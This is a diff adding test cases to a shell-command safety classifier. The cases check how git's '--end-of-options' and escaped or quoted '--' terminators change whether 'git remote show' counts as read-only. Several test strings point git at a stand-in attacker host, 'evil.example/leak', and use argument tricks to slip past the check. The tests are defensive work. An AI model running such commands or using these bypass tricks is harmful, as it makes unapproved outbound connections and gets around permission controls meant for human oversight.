@@ -429,6 +429,9 @@ describe('classifyShellCommandSafety', () => {
       // on the pre-terminator slice; these pin that it does.
       'git remote show origin -- -n',
       'git remote show -- -n https://evil.example/leak',
+      // git honours `--end-of-options` exactly like `--` (bot round 6 R6-1).
+      'git remote show https://evil.example/leak --end-of-options -n',
+      'git remote show --end-of-options https://evil.example/leak -n',
       // bash removes quotes and backslashes before git runs, so each of these
       // reaches git as a bare `--` although the argument text still holds them.
       'git remote show https://evil.example/leak \\-- -n',
@@ -452,6 +455,8 @@ describe('classifyShellCommandSafety', () => {
       'git remote show origin -n',
       'git remote show https://evil.example/leak -n',
       'git remote show -n "origin"',
+      // A `-n` before `--end-of-options` is still an option.
+      'git remote show -n --end-of-options origin',
       'git remote get-url origin',
     ])('keeps %j read-only', async (command) => {
       expect(await classifyShellCommandSafety(command)).toBe('read-only');
@@ -1052,6 +1057,11 @@ describe('consistency: isShellCommandReadOnly (regex) vs isShellCommandReadOnlyA
     ['git branch -d feature', false],
     ['git remote -v', true],
     ['git remote add origin url', false],
+    [
+      'git remote show origin --end-of-options -n',
+      false,
+      'end-of-options terminator',
+    ],
     ['git remote show origin \\-- -n', false, 'escaped terminator'],
     ["git remote show origin ''-- -n", false, 'quoted terminator'],
     ["git remote show origin $'--' -n", false, 'ANSI-C quoted terminator'],
